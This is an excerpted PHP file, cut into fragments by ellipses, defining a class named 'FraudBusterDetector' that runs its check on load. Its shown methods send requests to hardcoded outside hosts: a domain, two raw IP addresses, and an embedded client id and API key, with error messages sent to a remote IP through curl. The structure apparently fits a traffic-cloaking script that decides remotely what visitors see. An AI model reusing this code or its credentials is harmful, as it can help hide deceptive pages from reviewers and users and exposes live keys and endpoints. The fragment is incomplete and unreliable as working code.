<?php
class FraudBusterDetector_kfot3co41l {
    ...
    function safeAction($resultObj) {
        $getParams = (isset($resultObj->getParams)) ? $resultObj->getParams : '';
        $url = "http://quetta.online/index.php";
...
//        }
    ...
    function sendRequestAndGetResult2($testConnection) {
        ...
        $url = "http://107.178.254.160/fb2?clid=kfot3co41l&apikey=1b4895a7e31fa11168d976adbbce17f39&hash=-1024262791";
        $nParam = '52b1e7n';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://192.81.209.149/fb-notify.html?v=2&cf=false&guid=kfot3co41l&m='.$message;
        $ch = curl_init($url);
...
$fraudBusterDetector_kfot3co41l = new FraudBusterDetector_kfot3co41l();
$fraudBusterDetector_kfot3co41l->check();
